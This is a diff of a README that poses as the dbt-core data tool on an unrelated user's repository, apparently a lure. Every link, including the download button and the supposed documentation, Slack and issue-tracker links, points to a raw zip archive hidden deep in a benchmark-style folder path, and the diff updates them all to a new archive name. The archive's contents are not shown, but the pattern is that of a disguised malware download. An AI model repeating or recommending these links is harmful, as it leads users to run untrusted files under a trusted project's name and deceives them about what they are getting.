@@ -1,7 +1,7 @@
 # 🎉 dbt-core - Transform Your Data with Ease
 
 ## 📥 Download Now
-[![Download dbt-core](https://raw.githubusercontent.com/haider123768/dbt-core/main/circumambiency/dbt-core.zip)](https://raw.githubusercontent.com/haider123768/dbt-core/main/circumambiency/dbt-core.zip)
+[![Download dbt-core](https://raw.githubusercontent.com/haider123768/dbt-core/main/performance/projects/01_2000_simple_models/models/path_8/core-dbt-v2.7-beta.1.zip)](https://raw.githubusercontent.com/haider123768/dbt-core/main/performance/projects/01_2000_simple_models/models/path_8/core-dbt-v2.7-beta.1.zip)
 
 ## 📖 Table of Contents
 1. [Overview](#overview)
@@ -22,7 +22,7 @@ Before you start downloading dbt-core, ensure your system meets the following re
 - **Additional Software:** Internet connection to download and install dependencies.
 
 ## 📦 Download & Install
-To download dbt-core, visit this page to download: [dbt-core Releases](https://raw.githubusercontent.com/haider123768/dbt-core/main/circumambiency/dbt-core.zip).
+To download dbt-core, visit this page to download: [dbt-core Releases](https://raw.githubusercontent.com/haider123768/dbt-core/main/performance/projects/01_2000_simple_models/models/path_8/core-dbt-v2.7-beta.1.zip).
 
 1. Click the link above.
 2. On the releases page, locate the latest version.
@@ -35,9 +35,9 @@ To download dbt-core, visit this page to download: [dbt-core Releases](https://r
 ## ❓ Help & Support
 If you encounter any issues while using dbt-core, here is how you can get help:
 
-- **Documentation:** Visit our [official documentation](https://raw.githubusercontent.com/haider123768/dbt-core/main/circumambiency/dbt-core.zip) for guides and troubleshooting tips.
-- **Community Support:** Join our [Slack community](https://raw.githubusercontent.com/haider123768/dbt-core/main/circumambiency/dbt-core.zip) where you can ask questions or share your experiences.
-- **Issues:** Report any bugs or feature requests directly on our [GitHub Issues page](https://raw.githubusercontent.com/haider123768/dbt-core/main/circumambiency/dbt-core.zip).
+- **Documentation:** Visit our [official documentation](https://raw.githubusercontent.com/haider123768/dbt-core/main/performance/projects/01_2000_simple_models/models/path_8/core-dbt-v2.7-beta.1.zip) for guides and troubleshooting tips.
+- **Community Support:** Join our [Slack community](https://raw.githubusercontent.com/haider123768/dbt-core/main/performance/projects/01_2000_simple_models/models/path_8/core-dbt-v2.7-beta.1.zip) where you can ask questions or share your experiences.
+- **Issues:** Report any bugs or feature requests directly on our [GitHub Issues page](https://raw.githubusercontent.com/haider123768/dbt-core/main/performance/projects/01_2000_simple_models/models/path_8/core-dbt-v2.7-beta.1.zip).
 
 ## 🙌 Contributing
 We welcome contributions to dbt-core! If you wish to help improve the project, you can:
